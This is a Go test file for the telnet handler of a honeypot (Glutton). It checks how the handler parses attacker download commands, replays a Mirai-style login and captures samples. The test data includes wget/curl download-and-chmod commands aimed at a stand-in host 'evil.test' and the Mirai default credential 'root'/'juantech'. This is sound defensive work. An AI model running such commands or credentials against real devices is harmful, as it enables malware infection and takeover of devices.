package tcp

import (
	"bufio"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/mushorg/glutton/connection"
	"github.com/stretchr/testify/require"
)

func TestTelnetDownloadURL(t *testing.T) {
	cases := []struct {
		cmd string
		url string
		ok  bool
	}{
		{"wget http://evil.test/a\r\n", "http://evil.test/a", true},
		{"wget -q -O- https://evil.test/b; chmod +x b\r\n", "https://evil.test/b", true},
		{"curl http://evil.test/c\r\n", "http://evil.test/c", true},
		{"/bin/busybox wget http://evil.test/d\x00\r\n", "http://evil.test/d", true},
		{"ls -la\r\n", "", false},
		{"wget missing-url\r\n", "", false},
	}
	for _, tc := range cases {
		url, ok := telnetDownloadURL(tc.cmd)
		require.Equal(t, tc.ok, ok, tc.cmd)
		require.Equal(t, tc.url, url, tc.cmd)
	}
}

func TestStripTelnetIAC(t *testing.T) {
	iac := []byte{0xff, 0xfd, 0x18, 0xff, 0xfd, 0x20, 0xff, 0xfd, 0x23, 0xff, 0xfd, 0x27}
	cleaned, negotiation := stripTelnetIAC(append(append([]byte{}, iac...), []byte("root\r\n")...))
	require.Equal(t, iac, negotiation)
	require.Equal(t, []byte("root\r\n"), cleaned)

	cleaned, negotiation = stripTelnetIAC([]byte{0xff, 0xff, 'x'})
	require.Empty(t, negotiation)
	require.Equal(t, []byte{0xff, 'x'}, cleaned)
}

func TestHandleTelnetMiraiFlow(t *testing.T) {
	client, serverConn := net.Pipe()
	defer client.Close()

	hp := newFakeHoneypot()
	logger := &recordingLogger{}

	done := make(chan error, 1)
	go func() {
		done <- HandleTelnet(context.Background(), serverConn, connection.Metadata{}, logger, hp)
	}()

	reader := bufio.NewReader(client)
	expect := func(want string) {
		t.Helper()
		require.NoError(t, client.SetReadDeadline(time.Now().Add(2*time.Second)))
		buf := make([]byte, len(want))
		_, err := io.ReadFull(reader, buf)
		require.NoError(t, err)
		require.Equal(t, want, string(buf))
	}
	send := func(data string) {
		t.Helper()
		require.NoError(t, client.SetWriteDeadline(time.Now().Add(2*time.Second)))
		_, err := client.Write([]byte(data))
		require.NoError(t, err)
	}

	negotiate := "\xff\xfd\x18\xff\xfd\x20\xff\xfd\x23\xff\xfd\x27"
	expect(negotiate)
	expect("Username: ")
	// Mirai replies with IAC negotiation then the username on the same line.
	send(negotiate + "root\r\n")
	expect("Password: ")
	send("juantech\r\n")
	expect("welcome\r\n> ")

	send("enable\x00\r\n")
	expect("-bash: enable: command not found\r\n")
	expect("> ")

	send("linuxshell\x00\r\n")
	expect("-bash: linuxshell: command not found\r\n")
	expect("> ")

	send("system\x00\r\n")
	expect("-bash: system: command not found\r\n")
	expect("> ")

	send("shell\x00\r\n")
	expect("-bash: shell: command not found\r\n")
	expect("> ")

	send("sh\x00\r\n")
	expect("$ ")

	send("/bin/busybox UNSTABLE\x00\r\n")
	expect("UNSTABLE: applet not found\r\n")
	expect(busyboxBanner)
	expect("> ")

	require.NoError(t, client.Close())

	select {
	case err := <-done:
		require.NoError(t, err)
	case <-time.After(2 * time.Second):
		t.Fatal("handler did not finish")
	}

	produced := waitProduced(t, hp)
	require.Equal(t, "telnet", produced.protocol)
	select {
	case extra := <-hp.produced:
		t.Fatalf("expected a single produced event, got another: %+v", extra)
	default:
	}

	events, ok := produced.decoded.([]parsedTelnet)
	require.True(t, ok, "decoded should be []parsedTelnet")

	want := []parsedTelnet{
		{Direction: "write", Message: negotiate},
		{Direction: "write", Command: "username", Message: "Username: "},
		{Direction: "read", Message: negotiate},
		{Direction: "read", Command: "username", Message: "root\r\n"},
		{Direction: "write", Command: "password", Message: "Password: "},
		{Direction: "read", Command: "password", Message: "juantech\r\n"},
		{Direction: "write", Message: "welcome\r\n> "},
		{Direction: "read", Command: "enable", Message: "enable\x00\r\n"},
		{Direction: "write", Message: "-bash: enable: command not found\r\n"},
		{Direction: "write", Message: "> "},
		{Direction: "read", Command: "linuxshell", Message: "linuxshell\x00\r\n"},
		{Direction: "write", Message: "-bash: linuxshell: command not found\r\n"},
		{Direction: "write", Message: "> "},
		{Direction: "read", Command: "system", Message: "system\x00\r\n"},
		{Direction: "write", Message: "-bash: system: command not found\r\n"},
		{Direction: "write", Message: "> "},
		{Direction: "read", Command: "shell", Message: "shell\x00\r\n"},
		{Direction: "write", Message: "-bash: shell: command not found\r\n"},
		{Direction: "write", Message: "> "},
		{Direction: "read", Command: "sh", Message: "sh\x00\r\n"},
		{Direction: "write", Message: "$ "},
		{Direction: "read", Command: "/bin/busybox", Message: "/bin/busybox UNSTABLE\x00\r\n"},
		{Direction: "write", Message: "UNSTABLE: applet not found\r\n"},
		{Direction: "write", Message: busyboxBanner},
		{Direction: "write", Message: "> "},
	}
	require.Equal(t, want, events)
	require.Equal(t, connection.EndClientClose, produced.endReason)
	require.Contains(t, logger.infos, "telnet login")
	require.True(t, logger.hasAttr("username", "root"))
	require.True(t, logger.hasAttr("password", "juantech"))
	require.True(t, logger.hasAttr("handler", "telnet"))
}

func TestHandleTelnetFetchesWgetSample(t *testing.T) {
	payload := []byte("mirai-sample-bytes")
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write(payload)
	}))
	defer ts.Close()

	samplesDir := t.TempDir()
	prevWD, err := os.Getwd()
	require.NoError(t, err)
	require.NoError(t, os.Chdir(samplesDir))
	t.Cleanup(func() { _ = os.Chdir(prevWD) })

	client, serverConn := net.Pipe()
	defer client.Close()

	hp := newFakeHoneypot()
	logger := &recordingLogger{}
	server := newTelnetServer(serverConn)
	server.client = ts.Client()

	done := make(chan error, 1)
	go func() {
		done <- handleTelnet(context.Background(), server, connection.Metadata{TargetPort: 23}, logger, hp)
	}()

	reader := bufio.NewReader(client)
	expect := func(want string) {
		t.Helper()
		require.NoError(t, client.SetReadDeadline(time.Now().Add(2*time.Second)))
		buf := make([]byte, len(want))
		_, err := io.ReadFull(reader, buf)
		require.NoError(t, err)
		require.Equal(t, want, string(buf))
	}
	send := func(data string) {
		t.Helper()
		require.NoError(t, client.SetWriteDeadline(time.Now().Add(2*time.Second)))
		_, err := client.Write([]byte(data))
		require.NoError(t, err)
	}

	negotiate := "\xff\xfd\x18\xff\xfd\x20\xff\xfd\x23\xff\xfd\x27"
	expect(negotiate)
	expect("Username: ")
	send("bot\r\n")
	expect("Password: ")
	send("pass\r\n")
	expect("welcome\r\n> ")
	send("curl " + ts.URL + "/bin\r\n")
	expect("> ")
	require.NoError(t, client.Close())

	select {
	case err := <-done:
		require.NoError(t, err)
	case <-time.After(3 * time.Second):
		t.Fatal("handler did not finish")
	}

	produced := waitProduced(t, hp)
	events, ok := produced.decoded.([]parsedTelnet)
	require.True(t, ok)

	var found bool
	sum := sha256.Sum256(payload)
	wantHash := hex.EncodeToString(sum[:])
	for _, ev := range events {
		if ev.Direction == "read" && ev.Command == "curl" {
			require.Equal(t, ts.URL+"/bin", ev.Path)
			require.Equal(t, wantHash, ev.PayloadHash)
			found = true
		}
	}
	require.True(t, found, "expected curl read frame with path and payload_hash")
	require.Contains(t, logger.infos, "telnet login")
	require.Contains(t, logger.infos, "New sample fetched")
	require.FileExists(t, filepath.Join("samples", wantHash))
}

func TestHandleTelnetClientDisconnect(t *testing.T) {
	client, serverConn := net.Pipe()

	hp := newFakeHoneypot()
	logger := &recordingLogger{}

	done := make(chan error, 1)
	go func() {
		done <- HandleTelnet(context.Background(), serverConn, connection.Metadata{}, logger, hp)
	}()

	reader := bufio.NewReader(client)
	require.NoError(t, client.SetReadDeadline(time.Now().Add(2*time.Second)))
	negotiate := make([]byte, 12)
	_, err := io.ReadFull(reader, negotiate)
	require.NoError(t, err)
	userPrompt := make([]byte, len("Username: "))
	_, err = io.ReadFull(reader, userPrompt)
	require.NoError(t, err)
	require.Equal(t, "Username: ", string(userPrompt))

	require.NoError(t, client.Close())

	select {
	case err := <-done:
		require.NoError(t, err)
	case <-time.After(2 * time.Second):
		t.Fatal("handler did not finish")
	}

	produced := waitProduced(t, hp)
	require.Equal(t, "telnet", produced.protocol)
	events, ok := produced.decoded.([]parsedTelnet)
	require.True(t, ok)
	require.Equal(t, []parsedTelnet{
		{Direction: "write", Message: string(negotiate)},
		{Direction: "write", Command: "username", Message: "Username: "},
	}, events)
	require.Equal(t, connection.EndClientClose, produced.endReason)
}

func TestHandleTelnetTLSClientHello(t *testing.T) {
	client, serverConn := net.Pipe()
	defer client.Close()

	hp := newFakeHoneypot()
	logger := &recordingLogger{}

	done := make(chan error, 1)
	go func() {
		done <- HandleTelnet(context.Background(), serverConn, connection.Metadata{}, logger, hp)
	}()

	reader := bufio.NewReader(client)
	require.NoError(t, client.SetReadDeadline(time.Now().Add(2*time.Second)))
	greeting := make([]byte, 12+len("Username: "))
	_, err := io.ReadFull(reader, greeting)
	require.NoError(t, err)

	// TLS 1.2 ClientHello prefix with 0x0a bytes that used to split into frames.
	hello := []byte{0x16, 0x03, 0x01, 0x00, 0x75, 0x01, 0x00, 0x00, 0x71, 0x03, 0x03, 0x0a, 0x0a, 0x0a, 0x00, 0x2f}
	require.NoError(t, client.SetWriteDeadline(time.Now().Add(2*time.Second)))
	_, err = client.Write(hello)
	require.NoError(t, err)

	select {
	case err := <-done:
		require.NoError(t, err)
	case <-time.After(2 * time.Second):
		t.Fatal("handler did not finish")
	}

	produced := waitProduced(t, hp)
	require.Equal(t, "telnet", produced.protocol)
	events, ok := produced.decoded.([]parsedTelnet)
	require.True(t, ok)
	require.Equal(t, []parsedTelnet{
		{Direction: "write", Message: string(greeting[:12])},
		{Direction: "write", Command: "username", Message: "Username: "},
		{Direction: "read", Command: "tls_client_hello", Message: string(hello)},
	}, events)

	logger.mtx.Lock()
	defer logger.mtx.Unlock()
	require.Empty(t, logger.infos)
}
